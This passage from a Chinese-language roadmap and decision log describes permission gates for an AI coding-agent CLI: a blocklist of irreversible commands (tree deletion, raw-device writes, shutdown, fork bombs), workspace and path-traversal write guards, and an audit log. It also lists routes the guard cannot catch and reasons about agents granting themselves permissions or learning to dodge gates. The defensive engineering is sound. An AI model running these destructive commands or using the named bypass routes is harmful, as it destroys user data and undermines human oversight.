| 10.9.1 | 权限 allowlist 持久化 | **拆成两半，前半已完成（2026-09-18）**。缺口原样：`/workspace allow` 只在内存表里活着，**退出即清**，用户每次开新会话都要把同一串目录重打一遍。**前半（工作区授权持久化）= 已完成**：`/workspace allow --save <目录>` 之后关掉 flint 再开那条授权**自己回来**。**落地的形状**：新建 `src/permission/grants.ts`（`loadGrantsFile` / `persistedGrants` / `persistGrant` / `forgetGrants` / `resetGrantsFileCache`；**零第三方依赖**，只 import `node:fs` / `node:path` + `GLOBAL_DIR` + `normalizeProjectPath`），落盘 `~/.flint/permissions.json`，形状 `{ version, projects: { "<归一化项目键>": { write: [...] } } }`；`/workspace` 加 `--save` 开关与 `[长期]`/`[本会话]` 标签；`seedProjectContext()` 从"只 `clear()`"改成**先清后栽**（`clear()` 紧接 `fill(persistedGrants(项目键))`）。**四条承重**：① **只读一次** —— 启动把整份文件读进内存快照，运行期**不再读盘**（枢纽：闸管的**就是写**，而模型的 `write` 能改到 `~/.flint/` —— "每次调用重读配置"等于让模型**改文件给自己发授权**；读一次之后这条路不存在，改文件不生效、得重启，重启是人做的）；② **读不懂一律当没有**（坏 JSON / 形状不对 / `version` 认不出 → 空表）；③ **读不懂也不许覆盖**（记 `loadError`，两个写接口此后**拒写**、文件一字未变 —— 只做"退化"会漏掉"退化成空之后照常写盘就把**别的项目**的条目抹掉了"；这与 `ProjectRegistry` 的**静默失败刻意相反**）；④ **写失败必须报出来**（返回 `string \| undefined`，命令层印给用户）。**默认不落盘、`--save` 才落盘**（同"本次全部允许不许被截断"那条纪律：不把一句随口的话升级成永久许可）；**按项目分区、`clear` 只删本项目那个键**（读-改-写，否则 A 的 `clear` 会**越权跨项目**清掉 B 的）；相对写法在**落盘那一刻按项目键**（不是 cwd）解析成绝对路径。**刻意不做**：交互选择器（非 TTY / RPC 下自动选第一项，等于把"默认不落盘"自己推翻）· 跨项目视图（属 10.11）· 失效清理（路径暂时不存在 ≠ 授权该撤销）。验证：`verify-grants.ts` **83 项**，**变异 25 轮各自精准变红、零漏网零崩溃零锚点问题**（三处只有变异能照出来：去重两处实现**互相掩护** / E10 只放 B 项目看不见越权清 / E15 断在源码上改断**渲染输出**；一条探针全绿 → 证明 `serialize` 里"跳过空条目"是**死代码**并删除）。**后半（权限 allowlist 整体持久化）仍被 C1 挡着、未动** | `src/permission/grants.ts`（**新增**）+ `src/commands/builtin/workspace.ts` 加 `--save`/`clear` + `project-context.ts` 先清后栽｜**R12+R7**｜⚠C1（只挡后半） | 高 | 前半已完成 |
| 10.9.2 | 危险命令拦截 | **已完成（2026-09-18）**。缺口原样：拦在**权限弹窗之前**的灾难形态黑名单一直没有 —— 而弹窗恰好两处够不着（非 TTY / RPC 下权限**自动放行**；bash 的授权键是**完整命令串**，"本次全部允许"过一次就不再弹）。**落地的形状**：新建 `src/permission/danger.ts`（判据 `findDangerousCommand` **纯函数** + 钩子适配器 `guardDangerousCommand` + 教学拒因 `renderDangerReason`；**零项目依赖**），插进 `main.ts` 的 `before_tool_call` 钩子链**第二道闸**（① 契约锁 → ② 危险闸 → ③ git 路由，三者共用"拦在弹窗之前"这个位置与 `{action:'deny'}` 同一套契约）。三类形态：**删除整棵树**（目标命中"一棵树的根"：文件系统根 / 盘根 / UNC 共享根 / 家目录本身 / 系统目录本身 / **cwd 本身及其上级**）· **写裸设备与格式化**（`mkfs*` / `fdisk` / `parted` / `wipefs` / `diskpart` / `format C:` / `dd of=/dev/*` / 重定向到裸设备）· **关机重启与 fork 炸弹**。七条承重：① **只有 L1、没有 L2** —— 契约锁是"L1 字面闸 + L2 效果闸"，这条**只能有 L1**（删除不可逆，事后没有东西可比对、可回滚），于是判据方向被定成"**宁可少拦不可误拦**"（误拦的代价是可见的一句报错，而**误拦会让人把闸关掉**）；② **C7 走 B 选项** —— 拒 + 教学理由（说清没跑 / 命中哪类 / 为什么不可逆 / 三条出路），**零契约改动**；真觉得"想放行放不了"再上三态（C7 本身未解，只是不再阻塞本条）；③ **位置判据＝段首命令词**（按 `&& \|\| ; \| &` 换行切段）—— `git log --grep=reboot` / `grep shutdown src/` 里那些是**数据不是命令**，必须放过（与契约锁的 `mentionsContract` 刻意相反：文件名不会当动词用，这三个词会）；④ **看目标不看旗标** —— 目标是"一棵树的根"就拒，`rm -rf C:/x` 与 `rm C:/x` 一样是灾难；⑤ **只展开一层** shell 包装（`bash -c` / `cmd /c` / `powershell -Command`，展开后再判一次但**不再展开**）；⑥ **判据纯函数、cwd·home·platform 注入而非直读**（套件才能造真树、逐形状打靶、把方言当参数测）；⑦ **fail-open** —— 只认 `bash` 工具，args 形状不对一律放行。**刻意不做（判不出来，不是忘了做）**：`rm -rf $DIR` / `rm -rf $(pwd)` / 写进脚本再由 `npm run` 触发 / 换语言重写（**护栏不是沙箱**，拒因里对模型明说）· `rm -rf *`（通配范围判不出来）· `rm -rf ~/Documents` 一类"家目录里的其他目录"（形状与正当清理完全一样，属 10.9.3）· `curl … \| sh`（不是不可逆操作）· `git push --force` / `git reset --hard`（常见且经常正当，损失可从 reflog / 远端找回，写侧确认闸归 10.5.2）· `chmod -R 000 /` 与 `kill -9 -1`（判断题边界没划清，先不猜）。**已知代价**：`rm -rf /s` 会被拒（判成 S 盘根）—— MSYS 展开的副作用，与"认 `/c/...`"是同一枚硬币的两面，**要它还改不了**；cmd 的 `/s` `/q` 旗标另由 `isSlashFlag` 挡掉。验证：`verify-danger.ts` **172 项**，**变异 33 轮各自精准变红、零漏网零崩溃**（两条死代码探针转正为删除）；四处"只跑绿必漏"被回填（判据漏校验命令词 → 探针首跑三例同时误拦 / D13 标题与断言不符 → 没有活性的断言 / **C44 的"挪 cwd"在 Windows 上挪进了家目录之下等于没挪** / `rm -rf ~` 的拒因文案取错了身份 —— 靠端到端演示脚本照出）。 | `src/permission/danger.ts`（**新增**）+ `main.ts` 钩子链第二道闸｜**R3**｜⚠C7（走 B，未解） | 高 | 已完成 |
| 10.9.3 | 工作区外写保护 | **已完成（2026-09-18）**。缺口原样：`write` / `edit` 此前可以写任意路径——只要用户在权限弹窗上点一下"允许"，或干脆**不弹窗**（非 TTY / RPC 下权限**自动放行**），一个手滑的 `../` 或一条拼错的绝对路径就把文件落到项目外面去了；而 10.9.2 的危险闸只认"灾难形态"，`rm -rf ~/Documents` 那种形状与正当清理完全一样，**刻意**没管（当时明写"属 10.9.3"）。**落地的形状**：新建 `src/permission/workspace.ts`（判据 `isUnder` / `isOutsideWorkspace` / 适配器 `guardWorkspaceWrite` / 教学拒因 `renderWorkspaceReason` + 授权表 `workspaceGrants`；**零项目依赖**，只 import `node:path`），插进 `main.ts` 的 `before_tool_call` 钩子链**第三道闸**（① 契约锁 → ② 危险闸 → ③ **工作区闸** → ④ git 路由）。受管工具**恰好 write / edit**。**唯一的开门方式**：用户在 REPL 里手打 `/workspace allow <目录>`（新增 `src/commands/builtin/workspace.ts`）——**授权表与 `PermissionManager` 刻意分开**，理由是权限弹窗在非 TTY / RPC 下**自动放行**，把边界接到那上面等于接了个静默失效的开关。**六条承重**：① **用 `path.relative` 判"在不在里面"、绝不用字符串前缀**（`C:/…/Ts_Agent2` 的前缀正是 `C:/…/Ts_Agent`，兄弟目录会被误判成"在里面"）；② **`..` 判定必须带分隔符**（`..foo` 是里面的文件、不是上级）；③ **授权含子树、但不向上不向旁传播**（允许了父目录，子目录自然算在里面；反过来不成立）；④ **项目切换时清空授权**（授权表存的是**绝对路径**，不清就会真的跟着搬——与契约锁同一条纪律"凡在旧项目取得的许可都不跟着搬"）；⑤ **`bash` 刻意排除**（目标藏在命令串里、读与写长得一模一样——`grep x /etc/hosts` 与 `echo x > /etc/hosts` 在判据眼里无从区分，判它会误拦正常命令）；⑥ **fail-open**（非受管工具 / args 形状不对 / path 不是字符串一律放行）。**只有 L1 没有 L2**（外写是**效果**，没有可比对、可回滚的基线），故判据同样偏"宁可少拦不可误拦"。**刻意不做**：路径语义归一（`~` 不展开、MSYS `/c/...` 不认——与 read / write 同一口径；`/c/Users/…` 解析成 `C:\c\Users\…` 判"在外面"，是一条**看得见的拒绝**而非静默写错地方）· 拦"删"（删除归 10.9.2 的危险闸，且那条只挡灾难形态）· 把它做进权限弹窗。验证：`verify-workspace.ts` **126 项**，**变异 28 轮各自精准变红、零漏网零崩溃零探针绿**（一条 `target.trim() === ''` 的死代码由"变异全绿 → 探针取证"证明后删除；C9 的 try/catch 自守防 `path.resolve(cwd, 42)` 把套件崩在半路）。 | `src/permission/workspace.ts`（**新增**）+ `src/commands/builtin/workspace.ts`（**新增**）+ `main.ts` 钩子链第三道闸 + `project-context.ts` 切换时清空｜**R2+R3**｜— | 高 | 已完成 |
| 10.9.4 | 审计留痕 | **已完成（2026-09-19）**。缺口原样：三道闸拦下、用户拒绝、放行/收回目录，**事过无痕** —— 出了事查不到"谁在什么时候拦住过什么、谁开过哪扇门"。**落地的形状**：条目落进既有的 `events.jsonl`（`kind=system`、`tags` 带 `audit`），**没有新文件、没有新依赖**；新建 `src/permission/audit.ts` 作**统一落点**（`recordGateDeny` / `recordGrant` / `recordRevoke` / `recordPermissionChoice`），三个调用方各只剩一行：`harness/main.ts` 的钩子链、`runtime.ts` 的 `askPermission`、`commands/builtin/workspace.ts`。`eventlog/store.ts` 加 `recordAudit`（条目组装 + 落盘，与 `addNarrative` 同一个 sink）。**五条承重**：① **只记边界决定** —— 被闸拦下 · 用户拒绝 · 「本次全部允许」 · 放行/收回目录；一次性的"允许"与正常执行的调用**不记**（不改变授权状态，且 `tool-calls.jsonl` 流水已全量记下**含被拦的那些**：钩子拒了工具不执行，但 start/end 成对发过，span 照样收束 —— 审计再记一遍就是双份噪音）；② **拉通道** —— 条目不自动注入提示词，靠 `/events` / `search_events` / `pull_events` 主动拉（能立刻看到"自己刚被拦了几次"，留痕就成了**行为训练信号**）；③ **目标摘要按参数形状取、不按工具名**（`path` 优先于 `command`，挑不出来就兜底整串 JSON —— 不写"如果工具是 write 就取 path"，那样每加一个受管工具都得回来改，漏改的症状是**审计条目里目标一片空白**，不报错也没人注意）；④ **拒因只留首行** —— 那封几百字的"三条出路"信是**递给模型**的，查账的人要的只是"为什么被拦"，整封抄进来 `/events` 一屏放不下两条；⑤ **落盘失败静默**（审计是旁路，反噬主流程比记不上更坏；**但**授权类的写盘失败要写进 `reason` —— "授权已生效、只是没长期化"必须说清，谎报比漏记更坏）。**截断口径与流水 `argsDigest` 同 200 字**，**不新增泄露面**。**刻意不做**：把审计做成实时反馈（见②）· 记"是谁的会话/哪一轮"（钩子载荷里没有 `turnId`，要复盘按时间窗回流水翻）· 给审计单开一本账（`events.jsonl` 的 `system` 一类本就是"机器里程碑"，扩它比新开文件更省）。验证：`verify-audit.ts` **98 项**，**变异 24 轮最终零漏网零未命中零崩溃零锚点问题**（首轮 25 轮里 1 漏网 + 2 未命中 + 1 锚点 + 1 探针全绿，逐条修完才收敛）。**两处产品侧缺陷只有真跑才照得出来**：演示脚本先照出"整封拒因被抄进审计"（遂加"只留首行"）；变异照出"接线只有源码断言看得见"（删掉 `runtime` 里那行调用，F1–F8 全绿、只有 H2 文本断言变红 → 补 F9–F12 起真 `Runtime` 走真弹窗）。另有一处**套件自己的洞**值得记进纪律：「审计里不含换行」是**恒真的空断言** —— 落库那步 `opt()` 会先把所有空白折叠成单个空格，怎么写都照绿；真正能分辨的是"**第二行内容不许出现**」。 | `src/permission/audit.ts`（**新增**）+ `eventlog/store.ts` 加 `recordAudit` + `main.ts` / `runtime.ts` / `workspace.ts` 三处各接一行｜**R8**｜— | 中 | 已完成 |
| 10.9.5 | 路径穿越防护 | **已完成（2026-09-19）**。缺口原样两条：① 工具层**根本没有"解析"这一步** —— 五个路径 handler（read / write / edit / ls / grep）各自把参数 `path.replace(/\\/g, '/')` 一下就直接交给 fs，由 Node **隐式**按 `process.cwd()` 解析，于是**没有任何一处能回答"这次调用真正要碰的绝对路径是什么"**（10.9.3 的闸只好自己 `path.resolve` 一遍，与工具层那份是**两份**）；② **符号链接 / junction 完全没人追** —— `write cwd/link-out/x`（`link-out` 指向项目外）被判成"内部"照写，这是 10.9.3 从落地起就登记在案的边界，也正是"路径穿越"最真实的那一条。**落地的形状**：新建 `src/tools/paths.ts`（`resolveToolPath` = 全仓**唯一**的"相对 → 绝对"实现，只做 `path.resolve`、纯代数不碰 fs，同时给 `display`（原文反斜杠归一，回执仍印这串）与 `abs`（真正要碰的绝对路径）**两个值**；`realPathOf` = 真落点，对**最长的已存在祖先**求 `realpathSync.native` 再把余段原样接回）；**不新开第五道闸**，而是给 10.9.3 的工作区闸加**第二步** `findTraversal`：声明路径落在某个根里、而真落点出了那个根 → 拒，拒因 `renderTraversalReason` 与第一步**共用标记**（同一个问题的两个判据）但**出路刻意不同**（指"中间有一段是链接，改用真实路径"，**不是**"放行那个目录" —— 声明路径本来就在项目里，放行它解决不了问题）。**五条承重**：① **两步回答同一个问题**（"这次写会不会落到工作区外"），第一步按声明路径、第二步按真落点；次序刻意如此 —— 第一步更便宜更确定、拒因更通用，第二步只在第一步已放行且注入了解析器时才跑，代价（两次 fs）只落在真要写的调用上；② **`realpath` 是注入的**（装配处 `harness/main.ts` 每次调用现取 `workspaceGrants.list()` 与 `realPathOf`，所以 `/projects --switch` 与 `/workspace allow` 立刻生效），闸本身**不 import 任何碰 fs 的实现**（G1/G2 那条"判据只依赖 node:path 与钩子契约"因此一字未动），判据仍是纯的、能喂**假解析器**逐形状打靶；③ **缺省不注入 = 不追**（判据逐字退回改动前的行为 —— 既有 126 项断言零扰动）；④ **fail-open**（没注入解析器 / 解析器抛异常 / 一路退到根仍失败 → 都不拦）；判据的否定方向（"真落点出界"）要求证据确凿，**追不动就没有证据**；⑤ **域不扩张**（只认 write / edit 的 `path` 参数，同 10.9.3）。**三处假阳反例钉在套件里**：声明就不在这个根里 → **不是它的责任**（否则会拿 A 根套 B 根）· **cwd 自己就是符号链接**（macOS `/tmp → /private/tmp` 是常态）→ 两侧都取真落点再比，不许假阳 · 解析器抛异常 → fail-open。**刻意不做**：链式路径重写（只回答"真落点出没出这个根"）· 拦 `bash`（同 10.9.3，目标藏在命令串里、读写形状无异）· 它不是沙箱（绕开工具自己写都管不着，拒因里对模型明说）。验证：`verify-paths.ts` **70 项**，**变异 17 轮各自精准变红、零漏网零崩溃零锚点问题**；变异当场把三条**写得太松**的断言照出来（`C12` 只有"不拦"那一半 = 只证明了"没判"不是"判对了"；`F6b` 只断 display 形态 —— `read` handler 改回吃原始 `path` 时**全绿**，遂扩成"五个 handler 的原始串与 display 形态都不许进 fs"；`F8` 首项是 `length >= 0` 的**恒真空断言**）。另有两处**探针推翻了本仓旧说法**：`DETAILS.md` 写"普通版 `realpathSync` **不解 junction**"，实测 `realpathSync(link)` 与 `.native(link)` **结果逐字符相同**（差别只在**大小写是否规范**）→ 选 `native` 的理由**收窄成"要规范大小写"**，代码注释同步改口；同轮另测出 Windows 上 `path.relative` **大小写不敏感**，这正是判据敢拿真落点比边界而不担假阳的依据 | `src/tools/paths.ts`（**新增**）+ `permission/workspace.ts` 加第二步 `findTraversal`/`renderTraversalReason` + `harness/main.ts` 注入 `realpath` + `tools/builtin.ts` 五个 handler 接统一解析｜**R1** | — | 中 | 已完成 |

> **10.9.2 补记（2026-09-15）**：只做了**第一步**——把契约锁那扇敞着的 bash 门真正堵上（L1 事前字面闸 + L2 事后效果闸，落点 `src/project/charter.ts` 与 `src/tools/builtin.ts` 的 bash handler；完整理由、代价与边界见 DECISION_LOG 锚点 `log-2026-09-15-charter-bash-hole`）。
> 本条的**原意"模式黑名单 + 二次确认"仍未做**，两处卡点：① "哪些模式算危险"属**策略**不是正确性，得先拍一个判据（同"优先级/插队留给人"那条）；② "二次确认"被 **C7** 挡着——`decodeDeny` 目前只有"放行 / 拒绝"两态，装不下第三种结果。
>
> **10.9.2 补记二（2026-09-18）：两处卡点一处拍掉、一处绕开，本条落地。** ① "哪些模式算危险"拍成了**三类不可逆形态的黑名单**（删整棵树 / 写裸设备与格式化 / 关机重启与 fork 炸弹），判据刻意窄 —— **不是"尽量多拦"，而是"宁可少拦不可误拦"**，理由是本条**只有 L1、没有 L2**（删除不可逆，事后没有东西可比对、可回滚）：误拦让人把闸关掉，那比漏拦更坏。② **"二次确认"绕过而不推翻**：走 C7 的 **B 选项**（拒 + 教学理由 + 告诉他"要做请在你自己的终端里做"），**零契约改动**；C7 本身**未解**，只是不再阻塞本条 —— 真出现"这条命令经常正当、却被挡住"的证据时再上三态。落点 `src/permission/danger.ts` 挂在 `before_tool_call` 钩子链的**第二道闸**（契约锁 → 危险闸 → git 路由），三闸次序由 G3（源码文本）与 H13（真总线行为）双钉。**一条边界必须写在这里**：这是**护栏不是沙箱** —— 变量拼装、命令替换、写进脚本、换语言重写一律绕得过去，判据不声称挡得住；它挡的是"模型/用户顺手直接写出来"的那一类。完整决策（七条）与刻意不做清单见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-18-danger-gate)，结构侧（拦截链多一环）见 [ARCHITECTURE_LOG 锚点](./ARCHITECTURE_LOG.md#log-2026-09-18-danger-gate)。
>
> **10.9.3 补记（2026-09-18）：⚠C2 的阻塞不成立，本条落地，位置就在危险闸之后。** C2 记的是"`tools/spec.ts` 刻意无数组形状"，原先推断它会挡住需要"一组路径"的天赋；但本条的开门方式是**用户在输入框手打 `/workspace allow <目录>`**（一条命令、两件事：授权 + 记路径），**模型自己调的工具参数一个都没动**——`spec.ts` 的数组形状从头到尾没被碰。这条与 10.8.1（`@file` 输入引用）同型：**当约束看着要求扩协议时，先问"它属于哪一层"**——落在**输入层 / 命令层**就不必动**工具层**的契约。于是 C2 剩下的阻塞面只有 10.10.3（并行只读，那个确实要工具参数）。另一条要写在这里的边界：本闸**只管 flint 进程内、经模型之手**的写入 —— 用户自己在别的终端里写文件它管不着，`bash` 里的外写也**刻意**不管（目标藏在命令串里，读与写无法从形状上区分），所以它**不是沙箱**。
> 完整决策见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-18-workspace-gate)，结构侧（拦截链再加一环变成四道）见 [ARCHITECTURE_LOG 锚点](./ARCHITECTURE_LOG.md#log-2026-09-18-workspace-gate)。
>
> **10.9.1 补记（2026-09-18）：本条拆成两半，只做了跟工作区有关的那一半；另一半仍被 C1 挡着。** 起因是 10.9.3 交付之后用户直接提了这件事——"需要我强制打字命令才能实现共享，会不会有点麻烦？"。三条路里选了 **B：把工作区授权长期化**（A = 接进权限弹窗，被否，因为弹窗在非 TTY / RPC 下自动放行；C = 用环境变量白名单，等于把授权交给启动脚本，比手打命令更远）。**两半的分野**：10.9.1 原文的顾虑（C1，2026-09-04"刻意不做"整份 allowlist 落盘，怕"写进配置文件就等于给自己发长期通行证"）**正好落在 `PermissionManager` 那一半**；而"允许写哪个目录"这张表**本就是用户可见、用户手写的**（唯一写入者是 `/workspace` 命令），给它加个落盘位置不改变谁能授权。所以本条只取这一半：**不碰 `PermissionManager`、不碰 `tools/spec.ts`**。整体 allowlist 持久化**仍未做**，C1 那条冲突对它依旧成立。完整决策（七条，含为什么只做这一半）见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-18-grants)，结构侧（授权状态第一次跨进程存活）见 [ARCHITECTURE_LOG 锚点](./ARCHITECTURE_LOG.md#log-2026-09-18-grants)。
> 一条**新增的已知边界**写在这里：运行期直接改盘上那份 `permissions.json` **不生效**（"只读一次"的代价，也正是它存在的理由）—— 要生效就重启。这不是缺陷。

> **10.9.4 补记（2026-09-19）：这一条不是"再加一道闸"，是给前面三道闸装了一本账。** 前三件事（10.9.2 危险闸 / 10.9.3 工作区闸 / 10.9.1 前半的 `--save`）各自都工作，但**动作本身不留痕**：拦下就拦下了，放行就放行了，事后既查不到"这周被拦过几次、都是哪类"，也查不到"这个目录是谁、什么时候开的门"。于是本条的判据只有一条 —— **事后查得到**。**形状**：不新开文件，扩 `events.jsonl` 的 `system` 一类（它本就是"机器里程碑"的家），条目 `tags` 带 `audit` 便于按类圈选。**四条边界值得单独记住**：① **只记边界决定**，不记一次性"允许"、不记正常执行 —— 后者 `tool-calls.jsonl` 已全量记下（**含被拦的那些**：钩子拒了工具不执行，但 start/end 成对发过，span 照样收束），审计再记一遍就是双份噪音，而噪音的代价是**真事件被淹掉**；② **它是拉通道** —— 条目**绝不自动注入**提示词。这一条是设计不是遗漏：被审计的一方若能立刻看到"自己刚被拦了几次"，留痕就变成了**行为训练信号**（它会学着绕开那道闸），而审计的读者本该是人；③ **记的粒度是"一句话结论"** —— 拒因全文（教学理由 + 三条出路，几百字）是递给模型的，进审计的只有首行，否则 `/events` 一屏放不下两条；④ **授权类写盘失败要如实写进账里** —— "授权已生效、只是没能长期化"这件事必须看得见，**谎报比漏记更坏**（用户按"已经存上了"的账去理解，下次启动发现没了，会以为程序坏了）。完整决策见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-19-audit)，结构侧（第一个"只写不读、给人看"的旁路）见 [ARCHITECTURE_LOG 锚点](./ARCHITECTURE_LOG.md#log-2026-09-19-audit)。

> **10.9.4 补记二（2026-09-19 晚）：本条**不是新闸**，是给刚装好的账本做卫生 —— 顺带补上"测试会写到哪去"这条一直没人管的边界。** 起因很小：用户打开 `/events` 想看审计，**只显示前 20 条、而它们几乎全是测试产物**（123 条审计里混着 `拒 放行 C:\` 这种边界用例字面，另有 142 条 `probe-compaction-view` 压缩条目）。根因是套件**只做了半件隔离**：`verify-grants` / `verify-workspace` 把授权文件（`FLINT_PERMISSIONS_FILE` / `FLINT_PROJECTS_FILE`）指到了临时文件、却**没动 cwd**，而账本落点 `EVENTS_FILE = '.flint/events.jsonl'` 是**模块加载时就定死的相对路径**（`import` 先于套件代码体、它也不读环境变量），只有"写入那一刻"才参与解析的 `chdir` 拦得住。**做了四件事**：① **堵源头（闸）** —— 新增共享沙箱 `scripts/lib/sandbox.ts`（`enterSandbox`：mkdtemp → 三个落点一起重定向 → `chdir` → **自证** → 退出搬回并删），四套的 inline 隔离全换成一行；**自证是必须的**，四步里任何一步失效都表现为"测试照绿、账本照脏"，脏要事后才发现。② **加一张网** —— `collect-stats.mjs` 的 `snapshotLedger` / `diffLedger` + `run-verify.mjs` **逐套**快照对比：跑完 `.flint/` 必须**一字未变**，谁变了点名谁并计入退出码；**逐套而非只比首尾**（后者会让"张三写脏、李四清干净"漏掉，且出了脏说不出是谁写的）。这张网当场抓到**第三个污染源** `verify-compaction-usage.ts` —— 它文本里根本没有 `recordAudit` 那几个符号、是**经 `Runtime` 内部**的 `recordCompaction` 写账本的，闸那种文本扫描**永远看不见它**。③ **清存量** —— 265 条测试产物摘掉、**留 1 条真条目**（留一条而非清空，保证清完仍可解析），动手前先备份 `.flint/events.jsonl.bak-20260919`；`.flint/` 已 gitignore，故不产生提交。④ **`/events` 翻页 + 翻译** —— 翻页用 `offset`（跳过多少条最新的）而**不是 `page`**（点开是想看"最近发生了什么"，不是"浏览第 3 页"；页大小与坐标独立、改页大小不让"我在哪儿"失效），页脚给一条**可粘回去**的命令、序号取**全库位置**；翻译**只对封闭枚举反查** —— `kind` 五个值数得出来、故"事故"能翻回 `incident`，而 `tags` 是**开放集合**（用户可自建 `["工作区"]`），**只做单向注解、绝不反查**（反查会把他的标签静默改写成 `workspace`，查询意图坏了还不报错），认识的标签渲染成 `审计(audit)`、**机器值原样留在括号里**故仍查得到。**边界与代价**：对账**只在 `npm run verify` 里生效**（单跑某套只有它自己的沙箱在挡），且它比的是 `.flint/` 整体快照 —— **同时在另一个终端开着 flint 干活**时那一套会被误指（假红，重跑即消）。**不记 ARCHITECTURE_LOG**：产品侧只动了 `/events` 的渲染与参数解析，分层序 / 注入链路 / 子系统边界一处没动，按收录判据（"结构变没变"）不占它。完整决策（六条，含"闸与网为什么缺一不可"）见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-19-suite-sandbox)。

> **10.9.5 补记（2026-09-19）：本条没做成"第五道闸"，而是给 10.9.3 那道闸补了**第二步** —— 因为它和第一步回答的是同一句话。** 一开始的直觉是"再挂一个钩子"，但两步问的都是"**这次写会不会落到工作区外**"，只是判据换了：第一步看**声明的**路径（纯字符串代数，最便宜、最确定的那些情形一次就挡住），第二步看**真落点**（要碰 fs、要追链接，贵，所以只在第一步放行之后才跑）。做成两道闸的坏处很实际：同一件事会有两封措辞不同的拒因、两个不同的标记、两处"要不要计入审计"的判断，而模型看到的只是"又被拦了一次"。**共用一个标记、出路却刻意分开**，是这条设计的要害：第一步的出路是"`/workspace allow` 那个目录"，第二步的出路**不能是它** —— 声明路径本来就在项目里，放行它一点用没有，真正的出路是"中间有一段是链接，改用真实路径"。**方向给错比不给更坏。**

> 同轮两处**探针取证**值得单独记，因为它们各推翻/修正了一条本仓的既有说法：① `DETAILS.md` 里写着"普通版 `realpathSync` **不解 junction**"—— 本机实测**不成立**：`realpathSync(link)` 与 `realpathSync.native(link)` **结果逐字符相同**（都追到了真实目录），两者的差别只在**大小写是否规范**（普通版原样返回入参大小写，`native` 返回磁盘上的写法）。于是"为什么用 native"这个理由**从"只有它能追链接"收窄成"要规范大小写"**，`paths.ts` 文件头同步改口 —— 留着旧理由的后果不是难看，是**下一个人会照着它去推理**。② 同轮顺手测出 Windows 上 `path.relative` **大小写不敏感**，这正是判据敢拿"真落点"与"声明路径"比边界、而不担心大小写造成**假阳**的依据（否则每个路径都得先规范大小写才敢比）。**"cwd 自己就是符号链接"那条假阳反例也由此而来**（macOS 的 `/tmp → /private/tmp` 是常态）：只对目标取真落点、不对方根取，声明与真落点都在同一个真实子树里也会被判成出界 —— 所以判据写成"**两侧都取真落点再比**"。**不记 ARCHITECTURE_LOG**：拦截链还是四道闸，产品侧只多了"工具层统一解析"这一层内部零件与闸内部的一步，分层序 / 注入链路 / 子系统边界一处没动，按收录判据（"结构变没变"）不占它。完整决策（含"为什么不新开一道闸"与 fail-open 的立场）见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-19-path-traversal)。

#### P10.10 长任务编排

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.10.1 | 后台任务 | `bash` 全同步阻塞，跑 dev server 会顶死轮次 | 后台执行 + 输出环形缓冲 + 回读操作｜**新增**（进程/任务表管理）｜⚠C6 | 高 | 候选 |
| 10.10.2 | 子 Agent 派发 | 无 | 只读子 Agent（继承工具白名单、不写文件），只回结论｜**新增**（需递归注入 runtime 子集） | 高 | 候选 |
| 10.10.3 | 并行只读 | 无（P7「实用工具补全」里的"并行 read"仍未做） | 一次读多文件，分段返回｜R1｜⚠C2（要数组参数） | 中 | 候选 |
| 10.10.4 | 预算与中断恢复 | `maxTurns` 已有；缺时间预算与确定性续跑 | wall-clock 预算 + 中断落盘现场（todo/计划/未跑完命令）｜R6+R12 | 中 | 候选 |

#### P10.11 平台化：多项目管理与度量

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.11.1 | `/projects` 列表与切换 | **已完成（2026-09-16）**。缺口原样：`~/.flint/projects.jsonl` 一直在写（每次启动 `ensure(cwd)` 登记一行），却**没有任何入口能看见它**——项目一多，这张表就成了只有写入端、没有读取端的账本。**落地的形状**：新增第 14 个内置命令 `/projects`（`src/commands/builtin/projects.ts`）+ 零依赖纯逻辑 `src/project/projects.ts`（参数解析 / 选项目 / 排序 / 渲染全是纯函数，同 `gitignore.ts` 那一路形态）。不带参数只**列**（`●` 标当前、目录已不存在的行显式标注、按最近活动倒序、重名不猜）；切换必须显式 `--switch <名>`。**四条承重**：① **切换 = 把启动那几步对着新目录再走一遍** —— 那五步（TASK.md 种子 / memory 种子 / events 种子 / 契约锁 / 登记表 `ensure`）抽成**唯一实现** `src/harness/project-context.ts` 的 `seedProjectContext()`，启动与切换**共用同一份**（两份实现只会各错一半，而"少装一样"的症状恰恰是**看着正常**）。② **先清后栽** —— 三个 store 的 `loadFromFile` 对"文件不存在"的语义是**保持现状**（启动时正确），故切换方必须先 `reset()` 再 load；切到一个**什么都没有**的项目时，`reset()` 是**唯一**的擦除动作。③ **授权类配置清空、不重读** —— `package.json` 命令表与 `.flint/postcheck.json` 的"只在启动读一次"本身就是防线（防模型写配置自我授权），切换时只 `clear()`、**不重读新项目那一份**，回执明说"新项目的项目命令与自检要重启才生效"。④ **契约锁不跨项目继承** —— `charterLock` 是会话级的，切换后**回锁**（否则在 A 解锁的许可会被搬去 B）。**刻意不做交互选择器**：非 TTY 下 `runtime.select` 会自动返回第一项（`/model` 那条已知边界），而"切哪个项目"是最不该被默认的一步。**已知边界**：切换只改**本进程**的 cwd，不开新终端窗口，也不并行两个项目；且因为全项目的项目级路径都用相对路径（`.flint/*`、`TASK.md`、`sessions/`、`config/provider-keys.json`、bash/git 的 `process.cwd()`）在调用时才解析，chdir 之后这些会自动自愈，**需要显式处理的只有进程级单例内存状态、会话与技能**。验证：`verify-projects.ts` **80 项**（⑧ 段是**真切换**端到端：临时项目目录 + 真 Runtime + 真 Jsonl 会话仓，含"清单换 B""A 的会话文件一字未动""锁回锁""授权类清空""会话失败回滚 cwd""切到空项目先清后栽"），变异**十六轮**各自精准变红 | 列出（名称/路径/最近活动）+ `--switch` 切 cwd 并重载上下文｜**R9+R11** | 高 | 已完成 |
| 10.11.2 | 项目健康面板 `/project` | 状态散在 memory/todo/events 三处 | 一屏汇总：技术栈/分支/todo 进度/最近事件/记忆数｜R5+R6+R8+R13 | 中 | 候选 |
| 10.11.3 | 成本与耗时度量 | `/usage` 是全局口径，**没有按项目/按任务** | 按项目累计 token/耗时，按 turnId 出"这任务花多少"｜R13 | 中 | 候选 |
